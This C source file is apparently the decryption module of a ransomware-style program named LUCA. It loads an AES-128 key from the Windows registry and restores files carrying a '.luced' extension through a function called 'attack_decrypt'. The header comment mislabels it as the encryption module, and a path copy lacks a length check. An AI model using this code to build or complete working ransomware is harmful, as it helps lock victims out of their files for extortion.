/*  This file containes the code for the Encryption Module of LUCA. It provides methods for file and directory decryption. */
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winreg.h>
#include <string.h>
#include <mbedtls/aes.h>

#include "store_in_register.h"
#include "read_files.h"

#define REG_PATH "Software\\LUCAware"
#define DECRYPTION_KEY_NAME "DecryptionKey"

/* Constant values for AES 128 */
#define AES_KEY_SIZE 16
#define IV_SIZE 16
#define BUFFER_SIZE 4096

/* Error handling */
void handle_error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

/* Check if the path is for a .luced file */
int has_luced_extension(const char *path)
{
    const char *ext = strrchr(path, '.');
    return (ext && strcmp(ext, ".luced") == 0);
}

/* Decrypt a single file with AES 128 CRT */
void decrypt_file(const char *encrypted_path, const unsigned char *key)
{
    // Variables
    FILE *in = NULL;
    FILE *out = NULL;

    unsigned char iv[IV_SIZE];
    unsigned char nonce_counter[IV_SIZE];
    unsigned char stream_block[16] = {0};
    size_t nc_off = 0;

    char output_path[MAX_PATH];

    // Validate extension
    const char *ext = strrchr(encrypted_path, '.');
    if (!ext || strcmp(ext, ".luced") != 0)
        return;

    // Build output path by stripping ".luced" 
    size_t base_len = ext - encrypted_path;
    strncpy(output_path, encrypted_path, base_len);
    output_path[base_len] = '\0';

    // Open files
    in = fopen(encrypted_path, "rb");
    if (!in)
        handle_error("Cannot open encrypted file");

    out = fopen(output_path, "wb");
    if (!out)
        handle_error("Cannot create decrypted file");

    // Read IV
    if (fread(iv, 1, IV_SIZE, in) != IV_SIZE)
        handle_error("Failed to read IV");

    memcpy(nonce_counter, iv, IV_SIZE);

    // Setup AES
    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);

    if (mbedtls_aes_setkey_enc(&aes, key, 128) != 0)
        handle_error("AES key setup failed");

    // Decryption
    unsigned char buffer[BUFFER_SIZE];
    size_t n;

    while ((n = fread(buffer, 1, BUFFER_SIZE, in)) > 0) {
        if (mbedtls_aes_crypt_ctr(
                &aes, n, &nc_off,
                nonce_counter, stream_block,
                buffer, buffer) != 0)
            handle_error("AES-CTR decryption failed");

        if (fwrite(buffer, 1, n, out) != n)
            handle_error("Failed to write decrypted data");
    }

    // Cleanup
    mbedtls_aes_free(&aes);
    fclose(in);
    fclose(out);
}


/* Public API for files decryption */
int attack_decrypt() {
    storage_context_t ctx = { REG_PATH };

    /* Load AES key from registry */
    unsigned char key[AES_KEY_SIZE];
    if (load_value(&ctx, DECRYPTION_KEY_NAME, key, AES_KEY_SIZE) != 0) {
        return -1;
    }

    size_t count = 0;
    char **paths = find_paths(&count);

    if (!paths) {
        return 1;
    }

    for (size_t i = 0; i < count; i++) {
        if (has_luced_extension(paths[i])) {
            decrypt_file(paths[i], key);
        }
        free(paths[i]);
    }

    free(paths);

    return 0;
}
